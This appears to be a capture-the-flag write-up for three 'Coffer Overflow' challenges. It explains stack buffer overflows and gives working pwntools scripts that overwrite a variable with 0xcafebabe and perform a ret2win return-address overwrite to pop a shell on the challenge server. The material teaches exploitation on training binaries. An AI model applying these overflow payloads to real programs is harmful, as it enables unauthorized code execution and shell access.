## Coffer Overflow 0

Read source, there's a code var.

It's set to 0. At the end, if it's not 0, a shell is popped.

Literally HQ chall lol, just spam chars and a shell pops, cat flag.txt

<hr>

## Coffer Overflow 1
Same thing, except code must be 0xcafebabe.

Let's disassemble main, we'll find the difference between our input(rbp-0x20) and the var(rbp-0x8) is 24 bytes, so send 24 bytes + p64(0xcafebabe)

```python
from pwn import *
#p = process("./over0")
p = remote('2020.redpwnc.tf', 31255)
NUM_TO_VAR = 24
payload = b'A' * NUM_TO_VAR + p64(0xcafebabe)
p.sendline(payload)
p.interactive()
```

<hr>

## Coffer Overflow 2



ret2win exploit. There's a function called binFunction.

Our input is at rbp-0x10, so 0x10 + 8 bytes until return address.

Overwrite return address with address of binFunction, which pops a shell.

```python
from pwn import *
e = ELF("./over2")
NUM_TO_RET = 0x10 + 8
padding = b'A' * NUM_TO_RET
retgadget =  0x000000000040053e # ret
payload = flat(padding, retgadget, e.symbols['binFunction'], word_size=64)
#p = e.process()
p = remote('2020.redpwnc.tf', 31908)
p.sendline(payload)
p.interactive()
```
